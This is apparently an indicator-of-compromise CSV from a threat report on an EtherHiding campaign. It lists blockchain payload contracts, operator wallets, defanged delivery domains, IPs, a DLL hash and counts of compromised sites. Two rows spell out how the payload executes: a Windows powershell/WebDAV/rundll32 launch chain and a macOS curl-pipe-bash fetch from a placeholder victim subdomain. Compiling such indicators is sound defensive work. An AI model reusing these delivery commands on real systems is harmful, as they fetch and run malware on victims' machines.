type,value,notes,confidence,post_slug
other,BSC testnet (chainid 97) EtherHiding delivery - selector 0x6d4ce63c,Shared read selector ('get stored payload') across all 7 confirmed payload-hosting contracts - re-verified live via eth_call against all 12 known contracts during revalidation,high,betwanaa-boroo-webdav-etherhiding
selector,0x6d4ce63c,get() - returns the base64-encoded stage JS payload - live re-verified,high,betwanaa-boroo-webdav-etherhiding
selector,0x8da5cb5b,owner() - live re-verified against all 12 known contracts - matches original artifacts/22 exactly plus 2 branch contracts newly confirmed,high,betwanaa-boroo-webdav-etherhiding
selector,0x24513bb6,isGoalReached() - session-completion gate selector on the utility/gate contracts - not independently re-tested this session (different ABI from get()/owner()),medium,betwanaa-boroo-webdav-etherhiding
contract,0xA1decFB75C8C0CA28C10517ce56B710baf727d2e,Stage-1 payload contract (symmetryclosets chain) - owner 0xd71f4cdc... - live-reconfirmed - 853 sites directly observed calling it in the full 1816-site harvest,high,betwanaa-boroo-webdav-etherhiding
contract,0x7Fd85c090f2b35071C57a3b9FeAF462aaEb0E437,Rotated stage-1 contract - owner 0x25a7625b... - live-reconfirmed - 419 sites directly observed calling it,high,betwanaa-boroo-webdav-etherhiding
contract,0xfb448d465841c63f3bc433be61eb692b813d469d,Rotated stage-1 contract - owner 0x09813ef4... - live-reconfirmed - 244 sites directly observed calling it,high,betwanaa-boroo-webdav-etherhiding
contract,0xdf132e2893824e26ec8ae8014b4f4facd54ed67f,eu.mk-cluster stage-1 contract - owner 0xd71f4cdc... - live-reconfirmed - 61 sites directly observed calling it,high,betwanaa-boroo-webdav-etherhiding
contract,0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff,Windows-branch contract (symmetryclosets chain) - owner 0xd71f4cdc... - independently decoded this session - embedded domain rotated live between the original analysis and this revalidation (behtarin-site-shartbandi.com to site-shartbandi-farsi.com) - proven byte-for-byte,high,betwanaa-boroo-webdav-etherhiding
contract,0x68DcE15C1002a2689E19D33A3aE509DD1fEb11A5,macOS-branch contract (symmetryclosets chain) - owner 0xd71f4cdc... - independently decoded this session - embeds a curl-pipe-bash command (bahigo90bet.com) rather than the Windows WebDAV/rundll32 pattern,high,betwanaa-boroo-webdav-etherhiding
contract,0x0cd58060328e308a43d3c53cfd03a45233ea308a,eu.mk-cluster Windows-equivalent branch contract - owner 0xd71f4cdc... - independently decoded this session - embeds casinomhub.bet via the WebDAV/rundll32 pattern,high,betwanaa-boroo-webdav-etherhiding
contract,0xf4a32588b50a59a82fbA148d436081A48d80832A,Session-completion gate contract (isGoalReached) - no owner() - reverts on get() with selector 0x6d4ce63c as expected (different ABI - confirmed not a payload host),high,betwanaa-boroo-webdav-etherhiding
contract,0xaef2ed8b69efb5c1b9e75990a5f90d02eb5f84f8,Utility/gate contract - no owner() - directly called by 16 sites in the full harvest despite reverting on get(),medium,betwanaa-boroo-webdav-etherhiding
contract,0xeed9e134ce64bf74be001a942ee3e3cb5c12c999,Utility/gate contract - no owner() - not directly called by any site in the full 1816-site harvest,medium,betwanaa-boroo-webdav-etherhiding
contract,0x3d4aa83fe2aceb83a40ae09f03addd560abb5a85,Utility/gate contract - no owner() - directly called by 22 sites in the full harvest despite reverting on get(),medium,betwanaa-boroo-webdav-etherhiding
contract,0xb72158bb6642c92ef042aaa681e1ffb8b738ef65,Utility/gate contract - no owner() - not directly called by any site in the full 1816-site harvest,medium,betwanaa-boroo-webdav-etherhiding
wallet,0xd71f4cdc84420d2bd07f50787b4f998b4c2d5290,Primary operator wallet - owns 7 of the 12 known contracts including both symmetryclosets and eu.mk chains - nonce grew from 516826 (report) to 516859 (this revalidation - +33 in the gap) - balance ~435.24 tBNB,high,betwanaa-boroo-webdav-etherhiding
wallet,0x25a7625b3c74bb0452333c8d7f463a2f640fa5af,Secondary deployer wallet - owns 1 rotated stage-1 contract (419 sites) - nonce unchanged at 5 - balance ~0.10 tBNB,high,betwanaa-boroo-webdav-etherhiding
wallet,0x09813ef4ab9a7361a8d0455d57e9a81295dae5f8,Secondary deployer wallet - owns 1 rotated stage-1 contract (244 sites) - nonce unchanged at 1 - balance ~0.30 tBNB,high,betwanaa-boroo-webdav-etherhiding
domain,betwanaa[.]com,WebDAV delivery apex - confirmed same Cloudflare account as boroo[.]bet (identical NS pair) - registered 2025-02-05,high,betwanaa-boroo-webdav-etherhiding
domain,boroo[.]bet,WebDAV delivery apex - confirmed same Cloudflare account as betwanaa[.]com - registered 2024-12-10 - 5 victim-subdomain instances in a single ~2h burst on 2026-07-14,high,betwanaa-boroo-webdav-etherhiding
domain,1bet1yek[.]bet,WebDAV delivery apex - same toolkit/fingerprints as betwanaa/boroo - different Cloudflare account - registered 2024-03-11,high,betwanaa-boroo-webdav-etherhiding
domain,behtarin-site-shartbandi[.]com,WebDAV delivery apex - decoded from the Windows-branch contract at original analysis time (2026-07-15 early) - since rotated away from on the SAME contract address - registered 2024-09-17 - 3rd Cloudflare account (dayana/jarred NS pair),high,betwanaa-boroo-webdav-etherhiding
domain,site-shartbandi-farsi[.]com,WebDAV delivery apex - CURRENT embedded domain on the Windows-branch contract as of this revalidation (2026-07-15) - same Cloudflare NS pair as behtarin-site-shartbandi[.]com - registered 2024-09-17 (same day - bulk registration batch),high,betwanaa-boroo-webdav-etherhiding
domain,casinomhub[.]bet,WebDAV delivery apex - decoded from the eu.mk-cluster Windows-equivalent branch contract this session - same Cloudflare NS pair (dayana/jarred) - registered 2024-10-19,high,betwanaa-boroo-webdav-etherhiding
domain,bahigo90bet[.]com,curl-pipe-bash delivery apex (macOS branch only - NOT WebDAV) - decoded this session - same Cloudflare NS pair (dayana/jarred) - registered 2024-10-19 (same day as casinomhub[.]bet - bulk registration batch),high,betwanaa-boroo-webdav-etherhiding
domain,bsc-testnet-rpc.publicnode.com,Public BSC testnet RPC the injected loader beacons - a shared unauthenticated endpoint - also incidentally called by unrelated legitimate Web3/DeFi sites (see false-positive note below) - not itself malicious infrastructure,high,betwanaa-boroo-webdav-etherhiding
sha256,f11057ab58bef936d98ba189829c64260a6a540cdaa046f93613138e820c98c6,gc.key payload build recovered via urlscan file index (otkxhon.1bet1yek.bet 2026-07-06) - PE32+ DLL (GUI) x86-64 - 1268336 bytes - not independently re-obtained this session (both original victim subdomains and same-campaign siblings are already retired),high,betwanaa-boroo-webdav-etherhiding
filename,gc.key,Payload filename - confirmed identical across all delivery apexes and victim instances - invoked via rundll32 gc.key#1 (Windows) - ordinal export #1,high,betwanaa-boroo-webdav-etherhiding
ip,104.21.23.112,Cloudflare edge IP - betwanaa[.]com - not the true origin,medium,betwanaa-boroo-webdav-etherhiding
ip,172.67.210.207,Cloudflare edge IP - betwanaa[.]com - not the true origin,medium,betwanaa-boroo-webdav-etherhiding
ip,66.29.144.136,Pre-Cloudflare origin - betwanaa[.]com (Feb-Apr 2025) - Namecheap shared cPanel hosting - same /24-ish block as 1bet1yek[.]bet's pre-CF origin,medium,betwanaa-boroo-webdav-etherhiding
ip,66.29.136.63,Pre-Cloudflare origin - 1bet1yek[.]bet - Namecheap shared cPanel hosting - same block as betwanaa[.]com's pre-CF origin,medium,betwanaa-boroo-webdav-etherhiding
other,Compromised sites - raw urlscan RPC-beacon match,1816 unique apex domains independently re-enumerated via urlscan (domain:bsc-testnet-rpc.publicnode.com AND NOT page.apexDomain:publicnode.com) - corrected pagination - near-exact match to the original report's 1815/4020 figures,high,betwanaa-boroo-webdav-etherhiding
other,Compromised sites - false-positive correction,77 of the 1816 raw matches are legitimate Web3/DeFi sites (pancakeswap.finance - chaingpt.dev - various vercel.app/pages.dev crypto demos) incidentally calling the same public RPC - live-verified via owner()/get() fingerprint checks against all 37 non-campaign contracts found - confirmed zero passed either check - all 77 were already present in the ORIGINAL report's 1815-site figure,high,betwanaa-boroo-webdav-etherhiding
other,Compromised sites - redirect-attribution correction,5 apex domains in the 1739-site intermediate list were redirect-chain artifacts not real victims (amazon.com - google.com - youtube.com - aliexpress.com - unstives.com) - caught after directly testing sites and flagging amazon.com as implausible - resolved by checking the eth_call request's actual documentURL for all 70 flagged candidates - see revalidation-2026-07-15-full/00_REVALIDATION_LOG.md Steps 13-15,high,betwanaa-boroo-webdav-etherhiding
other,Compromised sites - final corrected total,1816 - 77 false positives - 5 redirect-attribution misattributions + 4 net-new correctly-attributed sites = 1738 independently confirmed compromised sites - see revalidation-2026-07-15-full/15_final_corrected_confirmed_sites.txt for the full list - accurate as of 2026-07-15 - treat as a floor not a ceiling for an active campaign,high,betwanaa-boroo-webdav-etherhiding
other,Contract-harvest scale-up result,Scaled the original 10-contract/24-site manual sample to a live-checked 1816-site population - found zero additional genuine campaign contracts beyond the already-known 12 - strong evidence the current contract/wallet picture is complete rather than a small-sample artifact,high,betwanaa-boroo-webdav-etherhiding
other,Execution mechanism - Windows,pcalua.exe -a powershell.exe -c saps cmd ... WebDAV @SSL UNC path -> rundll32 gc.key#1 - LOLBIN proxy launcher optional (confirmed present in one incident - absent in another with the same GUID/gc.key pattern),high,betwanaa-boroo-webdav-etherhiding
other,Execution mechanism - macOS,bin/bash -c curl -A 'Mac OS X 10_15_7' -fsSL {victim-subdomain}/?ublib={uuid} - a completely different mechanism from the Windows WebDAV/rundll32 pattern - decoded independently this session - never documented in the original report,high,betwanaa-boroo-webdav-etherhiding
other,3rd Cloudflare account - domain portfolio,Expanded from 1 known domain (behtarin-site-shartbandi[.]com) to 4 confirmed domains sharing the identical dayana/jarred NS pair - two clean same-day bulk-registration batches identified (2024-09-17 and 2024-10-19),high,betwanaa-boroo-webdav-etherhiding
